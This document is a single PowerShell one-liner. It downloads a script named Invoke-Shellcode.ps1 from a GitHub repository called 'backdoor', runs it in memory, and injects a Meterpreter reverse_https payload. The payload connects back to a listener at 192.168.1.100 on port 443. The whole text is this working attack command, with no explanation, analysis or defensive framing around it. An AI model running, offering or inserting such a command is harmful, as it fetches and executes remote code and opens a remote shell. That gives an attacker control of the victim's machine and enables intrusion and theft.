
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberhunter00/backdoor/master/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.100 -Lport 443 -force

